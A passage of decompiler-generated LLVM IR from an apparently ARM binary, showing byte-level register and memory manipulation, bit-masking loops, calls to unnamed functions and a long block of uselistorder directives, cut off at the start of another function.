  store i8 %v1_bf90, i8* %v4_bf90, align 1
  %v0_bf94 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf94 = trunc i32 %v0_bf94 to i8
  %v2_bf94 = load i32, i32* @r6, align 4
  %v3_bf94 = add i32 %v2_bf94, 13
  %v4_bf94 = inttoptr i32 %v3_bf94 to i8*
  store i8 %v1_bf94, i8* %v4_bf94, align 1
  %v0_bf98 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf98 = trunc i32 %v0_bf98 to i8
  %v2_bf98 = load i32, i32* @r6, align 4
  %v3_bf98 = add i32 %v2_bf98, 2
  %v4_bf98 = inttoptr i32 %v3_bf98 to i8*
  store i8 %v1_bf98, i8* %v4_bf98, align 1
  %v0_bf9c = call i32 @function_e978()
  %v1_bf9c = trunc i32 %v0_bf9c to i8
  store i32 %v0_bf9c, i32* %r0.global-to-local, align 4
  store i32 %v1_ba80, i32* %lr.global-to-local, align 4
  %v0_bfa4 = load i32, i32* @r6, align 4
  %v1_bfa4 = add i32 %v0_bfa4, 13
  %v2_bfa4 = inttoptr i32 %v1_bfa4 to i8*
  %v3_bfa4 = load i8, i8* %v2_bfa4, align 1
  %v4_bfa4 = zext i8 %v3_bfa4 to i32
  store i32 %v1_bfa8, i32* %r2.global-to-local, align 4
  %v1_bfac = and i32 %v4_bfa4, 223
  %v5_bfb0 = or i32 %v1_bfac, %v4_bfb0
  store i32 %v5_bfb0, i32* %r3.global-to-local, align 4
  %v1_bfb4 = trunc i32 %v5_bfb0 to i8
  store i8 %v1_bfb4, i8* %v2_bfa4, align 1
  store i32 %v1_baa0, i32* %r1.global-to-local, align 4
  %v0_bfbc = load i32, i32* @r6, align 4
  %v1_bfbc = add i32 %v0_bfbc, 13
  %v2_bfbc = inttoptr i32 %v1_bfbc to i8*
  %v3_bfbc = load i8, i8* %v2_bfbc, align 1
  %v4_bfbc = zext i8 %v3_bfbc to i32
  store i32 %v1_bfc0, i32* %r3.global-to-local, align 4
  %v1_bfc4 = and i32 %v4_bfbc, 239
  %v5_bfc8 = or i32 %v1_bfc4, %v4_bfc8
  store i32 %v5_bfc8, i32* %r2.global-to-local, align 4
  %v1_bfcc = trunc i32 %v5_bfc8 to i8
  store i8 %v1_bfcc, i8* %v2_bfbc, align 1
  store i32 %v1_bac0, i32* %ip.global-to-local, align 4
  %v0_bfd4 = load i32, i32* @r6, align 4
  %v1_bfd4 = add i32 %v0_bfd4, 13
  %v2_bfd4 = inttoptr i32 %v1_bfd4 to i8*
  %v3_bfd4 = load i8, i8* %v2_bfd4, align 1
  %v4_bfd4 = zext i8 %v3_bfd4 to i32
  store i32 %v1_bfd8, i32* %r2.global-to-local, align 4
  %v1_bfdc = and i32 %v4_bfd4, 247
  %v5_bfe0 = or i32 %v1_bfdc, %v4_bfe0
  store i32 %v5_bfe0, i32* %r3.global-to-local, align 4
  %v1_bfe4 = trunc i32 %v5_bfe0 to i8
  store i8 %v1_bfe4, i8* %v2_bfd4, align 1
  %v0_bfec = load i32, i32* @r6, align 4
  %v1_bfec = add i32 %v0_bfec, 13
  %v2_bfec = inttoptr i32 %v1_bfec to i8*
  %v3_bfec = load i8, i8* %v2_bfec, align 1
  %v4_bfec = zext i8 %v3_bfec to i32
  store i32 %v1_bff0, i32* %r3.global-to-local, align 4
  %v1_bff4 = and i32 %v4_bfec, 251
  %v5_bff8 = or i32 %v1_bff4, %v4_bff8
  store i32 %v5_bff8, i32* %r2.global-to-local, align 4
  %v1_bffc = trunc i32 %v5_bff8 to i8
  store i8 %v1_bffc, i8* %v2_bfec, align 1
  store i32 %v1_bb00, i32* %r1.global-to-local, align 4
  %v0_c004 = load i32, i32* @r6, align 4
  %v1_c004 = add i32 %v0_c004, 13
  %v2_c004 = inttoptr i32 %v1_c004 to i8*
  %v3_c004 = load i8, i8* %v2_c004, align 1
  %v4_c004 = zext i8 %v3_c004 to i32
  store i32 %v1_c008, i32* %r2.global-to-local, align 4
  %v1_c00c = and i32 %v4_c004, 253
  %v4_c010 = or i32 %v1_c00c, %v3_c010
  store i32 %v4_c010, i32* %r3.global-to-local, align 4
  %v1_c014 = trunc i32 %v4_c010 to i8
  store i8 %v1_c014, i8* %v2_c004, align 1
  %v0_c018 = load i32, i32* @r6, align 4
  %v1_c018 = add i32 %v0_c018, 13
  %v2_c018 = inttoptr i32 %v1_c018 to i8*
  %v3_c018 = load i8, i8* %v2_c018, align 1
  %v4_c018 = zext i8 %v3_c018 to i32
  %v0_c01c = load i32, i32* @r8, align 4
  %v1_c01c = urem i32 %v0_c01c, 2
  %v1_c020 = and i32 %v4_c018, 254
  store i32 %v1_c020, i32* %r2.global-to-local, align 4
  %v4_c02427 = udiv i32 %v0_bf9c, 256
  %v2_c028 = or i32 %v1_c020, %v1_c01c
  store i32 %v2_c028, i32* %r3.global-to-local, align 4
  %v1_c02c = trunc i32 %v4_c02427 to i8
  %v3_c02c = add i32 %v0_c018, 15
  %v4_c02c = inttoptr i32 %v3_c02c to i8*
  store i8 %v1_c02c, i8* %v4_c02c, align 1
  %v3_c030 = load i32, i32* @r6, align 4
  %v4_c030 = add i32 %v3_c030, 14
  %v5_c030 = inttoptr i32 %v4_c030 to i8*
  store i8 %v1_bf9c, i8* %v5_c030, align 1
  %v0_c034 = load i32, i32* %r3.global-to-local, align 4
  %v1_c034 = trunc i32 %v0_c034 to i8
  %v2_c034 = load i32, i32* @r6, align 4
  %v3_c034 = add i32 %v2_c034, 13
  %v4_c034 = inttoptr i32 %v3_c034 to i8*
  store i8 %v1_c034, i8* %v4_c034, align 1
  %v0_c038 = load i32, i32* @r4, align 4
  %v1_c038 = add i32 %v0_c038, 40
  store i32 %v1_c038, i32* %r0.global-to-local, align 4
  %v0_c03c = load i32, i32* @sb, align 4
  store i32 %v0_c03c, i32* @r1, align 4
  %v1_c040 = inttoptr i32 %v1_c038 to i8*
  %v2_c040 = call i32 @function_eaf8(i8* %v1_c040)
  store i32 %v2_c040, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c044

dec_label_pc_c044:                                ; preds = %dec_label_pc_bbe4, %bb81
  %v3_c044 = load i32, i32* %stack_var_-40, align 4
  %v1_c048 = add i32 %v3_c044, 1
  store i32 %v1_c048, i32* %r3.global-to-local, align 4
  %v1_c04c = load i32, i32* @fp, align 4
  %v9_c04c = icmp eq i32 %v1_c048, %v1_c04c
  store i1 %v9_c04c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c048, i32* %stack_var_-40, align 4
  %v5_c054 = icmp slt i32 %v1_c048, %v1_c04c
  br i1 %v5_c054, label %dec_label_pc_bbd4, label %dec_label_pc_c058

dec_label_pc_c058:                                ; preds = %dec_label_pc_c044, %.thread18
  %v0_c06012 = phi i32 [ %v0_bba8, %.thread18 ], [ %v1_c04c, %dec_label_pc_c044 ]
  %v0_c058 = load i32, i32* @sb, align 4
  %v1_c058 = add i32 %v0_c058, 40
  store i32 %v1_c058, i32* @sl, align 4
  %v1_c05c = add i32 %v0_c058, 20
  store i32 %v1_c05c, i32* @r7, align 4
  %v2_c0ac = icmp eq i32 %v1_bb58, 0
  %v6_c08c = inttoptr i32 %v2_b9c8 to i32*
  %v3_c094 = icmp eq i32 %v3_bbb0, 65535
  br label %dec_label_pc_c060

dec_label_pc_c060:                                ; preds = %dec_label_pc_c0bc, %dec_label_pc_c058
  %v0_c060 = phi i32 [ %v1_c19c, %dec_label_pc_c0bc ], [ %v0_c06012, %dec_label_pc_c058 ]
  %v2_c060 = icmp eq i32 %v0_c060, 0
  store i1 %v2_c060, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp82 = icmp slt i32 %v0_c060, 1
  br label %dec_label_pc_c068

dec_label_pc_c068:                                ; preds = %dec_label_pc_c068, %dec_label_pc_c060
  br i1 %tmp82, label %dec_label_pc_c068, label %dec_label_pc_c06c

dec_label_pc_c06c:                                ; preds = %dec_label_pc_c068
  %v0_c06c = load i32, i32* @r7, align 4
  %tmp83 = mul i32 %v0_c06c, 256
  %v1_c074 = and i32 %tmp83, 65280
  %tmp84 = udiv i32 %v0_c06c, 256
  %v4_c078 = urem i32 %tmp84, 256
  %v5_c078 = or i32 %v4_c078, %v1_c074
  store i32 %v5_c078, i32* @r8, align 4
  store i32 %v2_b9c8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_bbb0, i32* %ip.global-to-local, align 4
  %v7_c08c = load i32, i32* %v6_c08c, align 4
  store i32 %v7_c08c, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_c094, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_c0a0 = add i32 %v7_c08c, 20
  store i32 %v1_c0a0, i32* @r5, align 4
  br i1 %v3_c094, label %dec_label_pc_c1c8, label %dec_label_pc_c0a8

dec_label_pc_c0a8:                                ; preds = %dec_label_pc_c1a8, %dec_label_pc_c06c
  %v0_c0b0 = phi i32 [ %v7_c1b4, %dec_label_pc_c1a8 ], [ %v7_c08c, %dec_label_pc_c06c ]
  store i32 %v1_bb58, i32* %lr.global-to-local, align 4
  store i1 %v2_c0ac, i1* %cpsr_z.global-to-local, align 1
  %v1_c0b0 = add i32 %v0_c0b0, 40
  store i32 %v1_c0b0, i32* %r0.global-to-local, align 4
  %v0_c0b4 = load i32, i32* @sb, align 4
  store i32 %v0_c0b4, i32* @r1, align 4
  br i1 %v2_c0ac, label %dec_label_pc_c0bc, label %dec_label_pc_c1ec

dec_label_pc_c0bc:                                ; preds = %dec_label_pc_c0a8, %dec_label_pc_c1c8, %dec_label_pc_c1ec
  %v2_c0bc = phi i32 [ %v0_c0b0, %dec_label_pc_c0a8 ], [ %v0_c1e0, %dec_label_pc_c1c8 ], [ %v2_c0bc.pre, %dec_label_pc_c1ec ]
  %v0_c0bc = load i32, i32* @r6, align 4
  %v1_c0bc = trunc i32 %v0_c0bc to i8
  %v3_c0bc = add i32 %v2_c0bc, 10
  %v4_c0bc = inttoptr i32 %v3_c0bc to i8*
  store i8 %v1_c0bc, i8* %v4_c0bc, align 1
  %v0_c0c0 = load i32, i32* @r6, align 4
  %v1_c0c0 = trunc i32 %v0_c0c0 to i8
  %v2_c0c0 = load i32, i32* @r4, align 4
  %v3_c0c0 = add i32 %v2_c0c0, 11
  %v4_c0c0 = inttoptr i32 %v3_c0c0 to i8*
  store i8 %v1_c0c0, i8* %v4_c0c0, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c0c8 = load i32, i32* @r4, align 4
  store i32 %v0_c0c8, i32* @r0, align 4
  %v2_c0cc = call i32 @function_d0b8(i32 %v0_c0c8, i32 20)
  %v3_c0cc = trunc i32 %v2_c0cc to i8
  store i32 %v2_c0cc, i32* %r0.global-to-local, align 4
  %v3_c0d0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_b9b8, i32* %r2.global-to-local, align 4
  %v3_c0d8 = mul i32 %v3_c0d0, 16
  %v2_c0dc = add i32 %v3_c0d8, %v2_b9b8
  store i32 %v2_c0dc, i32* %r1.global-to-local, align 4
  %v1_c0e0 = add i32 %v2_c0dc, 4
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i32*
  %v3_c0e0 = load i32, i32* %v2_c0e0, align 4
  %v3_c0e4 = mul i32 %v3_c0e0, 65536
  store i32 %v3_c0e4, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_c0e0, 256
  %v1_c0ec = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_c0e0, 256
  %v4_c0f0 = urem i32 %tmp86, 256
  %v5_c0f0 = or i32 %v4_c0f0, %v1_c0ec
  store i32 %v5_c0f0, i32* %r2.global-to-local, align 4
  %v1_c0f4 = add i32 %v3_c0e0, 1
  store i32 %v1_c0f4, i32* %r3.global-to-local, align 4
  store i32 %v1_c0f4, i32* %v2_c0e0, align 4
  %v0_c0fc = load i32, i32* %r2.global-to-local, align 4
  %v1_c0fc = load i32, i32* @r5, align 4
  %v2_c0fc = add i32 %v1_c0fc, 4
  %v3_c0fc = inttoptr i32 %v2_c0fc to i32*
  store i32 %v0_c0fc, i32* %v3_c0fc, align 4
  %v0_c100 = load i32, i32* %r1.global-to-local, align 4
  %v1_c100 = add i32 %v0_c100, 8
  %v2_c100 = inttoptr i32 %v1_c100 to i32*
  %v3_c100 = load i32, i32* %v2_c100, align 4
  %tmp87 = mul i32 %v3_c100, 256
  %v1_c10c = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_c100, 256
  %v4_c110 = urem i32 %tmp88, 256
  %v5_c110 = or i32 %v4_c110, %v1_c10c
  store i32 %v5_c110, i32* %r2.global-to-local, align 4
  %v4_c11428 = udiv i32 %v2_c0cc, 256
  %v1_c118 = trunc i32 %v4_c11428 to i8
  %v2_c118 = load i32, i32* @r4, align 4
  %v3_c118 = add i32 %v2_c118, 11
  %v4_c118 = inttoptr i32 %v3_c118 to i8*
  store i8 %v1_c118, i8* %v4_c118, align 1
  %v3_c11c = load i32, i32* @r4, align 4
  %v4_c11c = add i32 %v3_c11c, 10
  %v5_c11c = inttoptr i32 %v4_c11c to i8*
  store i8 %v3_c0cc, i8* %v5_c11c, align 1
  %v0_c120 = load i32, i32* %r2.global-to-local, align 4
  %v1_c120 = load i32, i32* @r5, align 4
  %v2_c120 = add i32 %v1_c120, 8
  %v3_c120 = inttoptr i32 %v2_c120 to i32*
  store i32 %v0_c120, i32* %v3_c120, align 4
  %v0_c124 = load i32, i32* @r5, align 4
  store i32 %v0_c124, i32* @r1, align 4
  %v0_c128 = load i32, i32* @r8, align 4
  store i32 %v0_c128, i32* %r2.global-to-local, align 4
  %v0_c12c = load i32, i32* @r7, align 4
  store i32 %v0_c12c, i32* %r3.global-to-local, align 4
  %v0_c130 = load i32, i32* @r4, align 4
  store i32 %v0_c130, i32* %r0.global-to-local, align 4
  %v0_c134 = load i32, i32* @r6, align 4
  %v1_c134 = trunc i32 %v0_c134 to i8
  %v3_c134 = add i32 %v0_c124, 16
  %v4_c134 = inttoptr i32 %v3_c134 to i8*
  store i8 %v1_c134, i8* %v4_c134, align 1
  %v0_c138 = load i32, i32* @r6, align 4
  %v1_c138 = trunc i32 %v0_c138 to i8
  %v2_c138 = load i32, i32* @r5, align 4
  %v3_c138 = add i32 %v2_c138, 17
  %v4_c138 = inttoptr i32 %v3_c138 to i8*
  store i8 %v1_c138, i8* %v4_c138, align 1
  %v4_c13c = call i32 @function_d114(i32 %v0_c130, i32 %v0_c124, i32 %v0_c128, i32 %v0_c12c)
  %v5_c13c = trunc i32 %v4_c13c to i8
  store i32 %v4_c13c, i32* %r0.global-to-local, align 4
  %v4_c14029 = udiv i32 %v4_c13c, 256
  %v1_c144 = trunc i32 %v4_c14029 to i8
  %v2_c144 = load i32, i32* @r5, align 4
  %v3_c144 = add i32 %v2_c144, 17
  %v4_c144 = inttoptr i32 %v3_c144 to i8*
  store i8 %v1_c144, i8* %v4_c144, align 1
  %v3_c148 = load i32, i32* @r5, align 4
  %v4_c148 = add i32 %v3_c148, 16
  %v5_c148 = inttoptr i32 %v4_c148 to i8*
  store i8 %v5_c13c, i8* %v5_c148, align 1
  %v3_c14c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c14c, i32* %r3.global-to-local, align 4
  %v0_c150 = load i32, i32* @r4, align 4
  %v1_c150 = add i32 %v0_c150, 20
  %v2_c150 = inttoptr i32 %v1_c150 to i32*
  %v3_c150 = load i32, i32* %v2_c150, align 4
  %v5_c158 = mul i32 %v3_c14c, 24
  %v3_c160 = udiv i32 %v3_c150, 65536
  store i32 %v3_c160, i32* %r2.global-to-local, align 4
  %v2_c164 = add i32 %v5_c158, %arg2
  store i32 %v2_c164, i32* %ip.global-to-local, align 4
  %v3_c1684 = udiv i32 %v3_c150, 16777216
  %v1_c16c = trunc i32 %v3_c1684 to i8
  %v3_c16c = add i32 %v2_c164, 3
  %v4_c16c = inttoptr i32 %v3_c16c to i8*
  store i8 %v1_c16c, i8* %v4_c16c, align 1
  %v0_c170 = load i32, i32* %r2.global-to-local, align 4
  %v1_c170 = trunc i32 %v0_c170 to i8
  %v2_c170 = load i32, i32* %ip.global-to-local, align 4
  %v3_c170 = add i32 %v2_c170, 2
  %v4_c170 = inttoptr i32 %v3_c170 to i8*
  store i8 %v1_c170, i8* %v4_c170, align 1
  %v0_c174 = load i32, i32* @r4, align 4
  store i32 %v0_c174, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_bb68, i32* %r0.global-to-local, align 4
  %v0_c180 = load i32, i32* @sl, align 4
  store i32 %v0_c180, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c188 = load i32, i32* %ip.global-to-local, align 4
  %v6_c190 = inttoptr i32 %v0_c174 to i32*
  %v7_c190 = call i32 @function_1237c(i32 %v3_bb68, i32* %v6_c190, i32 %v0_c180, i32 16384, i32 %v0_c188, i32 16)
  %v3_c194 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c194, i32* %r3.global-to-local, align 4
  %v1_c198 = add i32 %v3_c194, 1
  store i32 %v1_c198, i32* %r0.global-to-local, align 4
  %v1_c19c = load i32, i32* @fp, align 4
  %v9_c19c = icmp eq i32 %v1_c198, %v1_c19c
  store i1 %v9_c19c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c198, i32* %stack_var_-40, align 4
  %v6_c1a4 = icmp slt i32 %v1_c198, %v1_c19c
  br i1 %v6_c1a4, label %dec_label_pc_c1a8, label %dec_label_pc_c060

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c0bc
  store i32 %v2_b9c8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_bbb0, i32* %ip.global-to-local, align 4
  %v4_c1b4 = mul i32 %v1_c198, 4
  %v5_c1b4 = add i32 %v4_c1b4, %v2_b9c8
  %v6_c1b4 = inttoptr i32 %v5_c1b4 to i32*
  %v7_c1b4 = load i32, i32* %v6_c1b4, align 4
  store i32 %v7_c1b4, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_c094, i1* %cpsr_z.global-to-local, align 1
  %v1_c1c0 = add i32 %v7_c1b4, 20
  store i32 %v1_c1c0, i32* @r5, align 4
  br i1 %v3_c094, label %dec_label_pc_c1c8, label %dec_label_pc_c0a8

dec_label_pc_c1c8:                                ; preds = %dec_label_pc_c1a8, %dec_label_pc_c06c
  %v0_c1c8 = call i32 @function_e978()
  %v1_c1c8 = trunc i32 %v0_c1c8 to i8
  store i32 %v1_bb58, i32* %lr.global-to-local, align 4
  %v4_c1d0 = sdiv i32 %v0_c1c8, 256
  store i32 %v4_c1d0, i32* %r3.global-to-local, align 4
  store i1 %v2_c0ac, i1* %cpsr_z.global-to-local, align 1
  %v3_c1d8 = load i32, i32* @r4, align 4
  %v4_c1d8 = add i32 %v3_c1d8, 4
  %v5_c1d8 = inttoptr i32 %v4_c1d8 to i8*
  store i8 %v1_c1c8, i8* %v5_c1d8, align 1
  %v0_c1dc = load i32, i32* %r3.global-to-local, align 4
  %v1_c1dc = trunc i32 %v0_c1dc to i8
  %v2_c1dc = load i32, i32* @r4, align 4
  %v3_c1dc = add i32 %v2_c1dc, 5
  %v4_c1dc = inttoptr i32 %v3_c1dc to i8*
  store i8 %v1_c1dc, i8* %v4_c1dc, align 1
  %v0_c1e0 = load i32, i32* @r4, align 4
  %v1_c1e0 = add i32 %v0_c1e0, 40
  store i32 %v1_c1e0, i32* %r0.global-to-local, align 4
  %v0_c1e4 = load i32, i32* @sb, align 4
  store i32 %v0_c1e4, i32* @r1, align 4
  %v0_c1e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c1e8, label %dec_label_pc_c0bc, label %dec_label_pc_c1ec

dec_label_pc_c1ec:                                ; preds = %dec_label_pc_c0a8, %dec_label_pc_c1c8
  %v0_c1ec = phi i32 [ %v1_c0b0, %dec_label_pc_c0a8 ], [ %v1_c1e0, %dec_label_pc_c1c8 ]
  %v1_c1ec = inttoptr i32 %v0_c1ec to i8*
  %v2_c1ec = call i32 @function_eaf8(i8* %v1_c1ec)
  store i32 %v2_c1ec, i32* %r0.global-to-local, align 4
  %v2_c0bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0bc

; uselistorder directives
  uselistorder i32 %v0_c1e0, { 1, 0 }
  uselistorder i32 %v7_c1b4, { 1, 2, 0 }
  uselistorder i32 %v1_c19c, { 1, 2, 0 }
  uselistorder i32 %v1_c198, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_c13c, { 0, 2, 1 }
  uselistorder i32 %v0_c124, { 1, 0, 2 }
  uselistorder i32 %v3_c100, { 1, 0 }
  uselistorder i32 %v3_c0e0, { 3, 2, 0, 1 }
  uselistorder i32 %v2_c0cc, { 0, 2, 1 }
  uselistorder i32 %v0_c0b0, { 1, 0 }
  uselistorder i32 %v0_c06c, { 1, 0 }
  uselistorder i32 %v0_c060, { 1, 0 }
  uselistorder i1 %v3_c094, { 2, 3, 1, 0 }
  uselistorder i32 %v1_c048, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bf9c, { 0, 2, 1 }
  uselistorder i32 %v3_bf7c, { 1, 0 }
  uselistorder i32 %v0_bf50, { 1, 0, 2 }
  uselistorder i32 %v3_bf44, { 1, 0 }
  uselistorder i32 %v3_bed8, { 1, 0 }
  uselistorder i32 %v0_becc, { 1, 0 }
  uselistorder i32 %v3_be54, { 1, 0 }
  uselistorder i32 %v2_be40, { 1, 0 }
  uselistorder i32 %v3_be24, { 1, 0, 2, 3 }
  uselistorder i32 %v2_be1c, { 1, 0 }
  uselistorder i32 %v3_bdf8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bdf0, { 1, 0 }
  uselistorder i32 %v4_bdd8, { 1, 0 }
  uselistorder i32 %v0_bdd4, { 0, 2, 1 }
  uselistorder i1 %v7_bd44, { 1, 0 }
  uselistorder i32 %v7_bd3c, { 0, 2, 1, 3 }
  uselistorder i32 %v5_bd88, { 1, 0 }
  uselistorder i1 %v9_bd6c, { 1, 0 }
  uselistorder i32 %v4_bd80, { 1, 0 }
  uselistorder i32 %v4_bd7c, { 1, 0 }
  uselistorder i32 %v8_bc90, { 1, 2, 0, 3 }
  uselistorder i32 %v3_bc7c, { 1, 0 }
  uselistorder i32 %v0_bc6c, { 2, 0, 1, 3 }
  uselistorder i1 %v7_bbf4, { 1, 0 }
  uselistorder i32 %v3_bbf0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c008, { 1, 0 }
  uselistorder i32 %v1_bff0, { 1, 0 }
  uselistorder i32 %v1_bfd8, { 1, 0 }
  uselistorder i32 %v1_bfc0, { 1, 0 }
  uselistorder i32 %v1_bfa8, { 1, 0 }
  uselistorder i32 %v5_bd84, { 1, 0 }
  uselistorder i32 %v3_bcd893, { 1, 0 }
  uselistorder i1 %v2_bd9c, { 1, 0 }
  uselistorder i32 %v1_bd98, { 1, 0 }
  uselistorder i32 %v4_bd94, { 2, 0, 1 }
  uselistorder i32 %v4_bd78, { 1, 0 }
  uselistorder i1 %v3_bcc0, { 1, 0 }
  uselistorder i32 %v8_bbbc, { 2, 1, 0 }
  uselistorder i32 %v8_bbb8, { 1, 2, 0 }
  uselistorder i32 %v3_bbb0, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_bbac, { 0, 1, 3, 2 }
  uselistorder i1 %v7_bba0, { 1, 0 }
  uselistorder i1 %v7_bb70, { 1, 0 }
  uselistorder i32 %v3_bb6c, { 2, 0, 1 }
  uselistorder i32 %v3_bb68, { 5, 6, 1, 3, 4, 7, 8, 2, 0, 9 }
  uselistorder i32 %v1_bb58, { 1, 3, 2, 0 }
  uselistorder i32 %v1_bb00, { 1, 0 }
  uselistorder i32 %v1_bac0, { 1, 0 }
  uselistorder i32 %v1_baa0, { 1, 0 }
  uselistorder i32 %v1_ba80, { 1, 0 }
  uselistorder i32 %v1_ba48, { 1, 0 }
  uselistorder i32 %v2_b9c8, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32 %v2_b9b8, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_b99c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32* %r2.global-to-local, { 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 41, 42, 43, 44, 45, 46, 47, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 18, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 37, 36, 38, 40, 39, 0 }
  uselistorder i32* %r0.global-to-local, { 53, 52, 54, 55, 57, 56, 61, 58, 59, 62, 60, 8, 1, 2, 3, 4, 5, 6, 7, 12, 9, 10, 11, 13, 15, 14, 17, 16, 20, 18, 21, 22, 19, 23, 25, 24, 26, 27, 29, 28, 33, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %lr.global-to-local, { 9, 10, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %ip.global-to-local, { 31, 32, 33, 34, 35, 36, 37, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i1* %cpsr_z.global-to-local, { 18, 19, 20, 21, 22, 23, 24, 25, 0, 3, 1, 2, 4, 5, 6, 7, 9, 26, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 768, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_c1ec, { 1, 0 }
  uselistorder label %dec_label_pc_c0bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c044, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %.thread6, { 2, 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %dec_label_pc_bdcc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bd04, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_bcb4, { 1, 0 }
}

define i32 @function_c1f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c1f8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_c1fc = urem i32 %arg1, 256
  store i32 %v1_c1fc, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c214 = urem i32 %arg3, 256
  store i32 %v1_c214, i32* @r4, align 4
  %v2_c218 = call i32 @function_126cc(i32 %v1_c1fc, i32 4)
  %v0_c21c = load i32, i32* @r5, align 4
  store i32 %v0_c21c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c22c = load i32, i32* @r4, align 4
  %v5_c230 = inttoptr i32 %v0_c21c to i32*
  %v6_c230 = call i32 @function_85e0(i32 %v0_c22c, i32* %v5_c230, i32 2, i32 0)
  %v1_c23c = urem i32 %v6_c230, 256
  store i32 %v1_c23c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c248 = load i32, i32* @r5, align 4
  store i32 %v0_c248, i32* %r1.global-to-local, align 4
  %v0_c24c = load i32, i32* @r4, align 4
  %v5_c250 = trunc i32 %v6_c230 to i8
  %v6_c254 = inttoptr i32 %v0_c248 to i32*
  %v7_c254 = call i32 @function_85e0(i32 %v0_c24c, i32* %v6_c254, i32 3, i32 65535)
  %v0_c258 = load i32, i32* @r5, align 4
  store i32 %v0_c258, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_c254, i32* @r8, align 4
  %v0_c268 = load i32, i32* @r4, align 4
